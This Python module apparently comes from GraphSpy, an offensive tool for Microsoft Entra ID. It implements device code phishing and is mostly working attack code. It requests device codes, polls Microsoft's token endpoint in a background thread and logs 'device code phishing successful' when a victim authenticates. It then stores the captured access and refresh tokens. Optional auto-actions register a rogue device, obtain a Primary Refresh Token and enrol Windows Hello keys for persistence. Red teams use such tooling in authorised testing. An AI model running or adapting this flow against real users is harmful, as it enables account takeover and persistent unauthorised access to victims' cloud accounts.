# graphspy/core/device_codes.py

# Built-in imports
import json
from datetime import datetime
from threading import Thread

# External library imports
import jwt
import requests
from flask import current_app
from loguru import logger

# Local library imports
from ..db import connection
from ..core import user_agent as ua
from .device import register
from .errors import AppError
from .prt import (
    request_for_device,
    refresh_to_access_token as prt_refresh_to_access_token,
)
from .tokens import parse_token_endpoint_error, save_access_token, save_refresh_token
from .winhello import register as register_winhello


def generate(
    version: int = 1,
    client_id: str = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    resource: str = "https://graph.microsoft.com",
    scope: str = "https://graph.microsoft.com/.default openid offline_access",
    ngcmfa: bool = False,
    cae: bool = False,
    auto_action=None,
    auto_device_name=None,
    auto_join_type=None,
    auto_device_type=None,
    auto_os_version=None,
    auto_target_domain=None,
) -> str:
    if version == 1:
        body = {"client_id": client_id, "resource": resource}
        if ngcmfa:
            body["amr_values"] = "ngcmfa"
        url = "https://login.microsoftonline.com/common/oauth2/devicecode"
    elif version == 2:
        body = {"client_id": client_id, "scope": scope}
        if ngcmfa or cae:
            claims_json = {"access_token": {}}
            if ngcmfa:
                claims_json["access_token"]["amr"] = {"values": ["ngcmfa"]}
            if cae:
                claims_json["access_token"]["xms_cc"] = {"values": ["cp1"]}
            body["claims"] = json.dumps(claims_json)
        url = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
    else:
        raise AppError(f"Unsupported token endpoint version: '{version}'")

    response = requests.post(url, data=body, headers={"User-Agent": ua.get()})
    if response.status_code != 200:
        raise AppError(
            f"Failed to generate device code.\n{parse_token_endpoint_error(response)}"
        )

    connection.execute_db(
        "INSERT INTO devicecodes (generated_at, expires_at, user_code, device_code, interval, client_id, status, last_poll, auto_action, auto_device_name, auto_join_type, auto_device_type, auto_os_version, auto_target_domain) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (
            int(datetime.now().timestamp()),
            int(datetime.now().timestamp()) + int(response.json()["expires_in"]),
            response.json()["user_code"],
            response.json()["device_code"],
            int(response.json()["interval"]),
            client_id,
            "CREATED",
            0,
            auto_action,
            auto_device_name,
            auto_join_type,
            auto_device_type,
            auto_os_version,
            auto_target_domain,
        ),
    )
    return response.json()["device_code"]


def poll(app) -> None:
    import time

    with app.app_context():
        while True:
            rows = connection.query_db_json(
                "SELECT * FROM devicecodes WHERE status IN ('CREATED','POLLING')"
            )
            if not rows:
                return
            for row in sorted(rows, key=lambda x: x["last_poll"]):
                current_time = int(datetime.now().timestamp())
                if current_time > row["expires_at"]:
                    connection.execute_db(
                        "UPDATE devicecodes SET status = ? WHERE device_code = ?",
                        ("EXPIRED", row["device_code"]),
                    )
                    continue
                next_poll = row["last_poll"] + row["interval"]
                if current_time < next_poll:
                    time.sleep(next_poll - current_time)
                if row["status"] == "CREATED":
                    connection.execute_db(
                        "UPDATE devicecodes SET status = ? WHERE device_code = ?",
                        ("POLLING", row["device_code"]),
                    )
                response = requests.post(
                    "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0",
                    data={
                        "client_id": row["client_id"],
                        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                        "code": row["device_code"],
                    },
                    headers={"User-Agent": ua.get()},
                )
                connection.execute_db(
                    "UPDATE devicecodes SET last_poll = ? WHERE device_code = ?",
                    (int(datetime.now().timestamp()), row["device_code"]),
                )
                if response.status_code != 200 or "access_token" not in response.json():
                    continue
                access_token = response.json()["access_token"]
                user_code = row['user_code']
                logger.debug("Device code phishing successful for code '{}'", user_code)
                access_token_id = save_access_token(
                    access_token, f"Created using device code auth ({row['user_code']})"
                )
                decoded = jwt.decode(access_token, options={"verify_signature": False})
                idtyp = decoded.get("idtyp")
                if idtyp == "user":
                    user = decoded.get("unique_name") or decoded.get("upn") or "unknown"
                elif idtyp == "app":
                    user = (
                        decoded.get("app_displayname")
                        or decoded.get("appid")
                        or "unknown"
                    )
                else:
                    user = "unknown"
                refresh_token_id = save_refresh_token(
                    response.json()["refresh_token"],
                    f"Created using device code auth ({row['user_code']})",
                    user,
                    decoded.get("tid", "unknown"),
                    response.json().get("resource", "unknown"),
                    int(response.json()["foci"]) if "foci" in response.json() else 0,
                    row["client_id"],
                )
                if row.get("auto_action") in ["device_prt", "winhello"]:
                    connection.execute_db(
                        "UPDATE devicecodes SET status = ? WHERE device_code = ?",
                        ("ACTION_IN_PROGRESS", row["device_code"]),
                    )
                    try:
                        logger.debug("Performing auto action '{}' for code '{}'", row.get('auto_action'), user_code)
                        device_id = register(
                            access_token_id,
                            row.get("auto_device_name"),
                            row.get("auto_join_type"),
                            row.get("auto_device_type"),
                            row.get("auto_os_version"),
                            row.get("auto_target_domain"),
                        )
                        prt_id = request_for_device(
                            device_id, refresh_token_id, row.get("auto_os_version")
                        )
                        if row.get("auto_action") == "winhello":
                            at_id = prt_refresh_to_access_token(
                                prt_id,
                                "dd762716-544d-4aeb-a526-687b73838a22",
                                "urn:ms-drs:enterpriseregistration.windows.net",
                            )
                            register_winhello(at_id)
                    except Exception as e:
                        logger.error("Device code phishing successful for code '{}', but auto action '{}' failed: {}", user_code, row.get('auto_action'), e)
                        connection.execute_db(
                            "UPDATE devicecodes SET status = ? WHERE device_code = ?",
                            ("PARTIAL_SUCCESS", row["device_code"]),
                        )
                        continue
                connection.execute_db(
                    "UPDATE devicecodes SET status = ? WHERE device_code = ?",
                    ("SUCCESS", row["device_code"]),
                )


def start_polling_thread() -> str:
    app = current_app._get_current_object()
    if "device_code_thread" in app.config:
        if app.config["device_code_thread"].is_alive():
            return "[Error] Device Code polling thread is still running."
    app.config["device_code_thread"] = Thread(target=poll, args=(app,))
    app.config["device_code_thread"].start()
    return "[Success] Started device code polling thread."


def list_device_codes() -> str:
    rows = connection.query_db_json("SELECT * FROM devicecodes")
    for row in rows:
        row.update(generated_at=f"{datetime.fromtimestamp(row['generated_at'])}")
        row.update(expires_at=f"{datetime.fromtimestamp(row['expires_at'])}")
        row.update(last_poll=f"{datetime.fromtimestamp(row['last_poll'])}")
    return json.dumps(rows)


def flow(
    version=1,
    client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",
    resource="https://graph.microsoft.com",
    scope="https://graph.microsoft.com/.default openid offline_access",
    ngcmfa=False,
    cae=False,
    **kwargs,
) -> str:
    device_code = generate(version, client_id, resource, scope, ngcmfa, cae, **kwargs)
    row = connection.query_db_json(
        "SELECT * FROM devicecodes WHERE device_code = ?", [device_code], one=True
    )
    start_polling_thread()
    return row["user_code"]
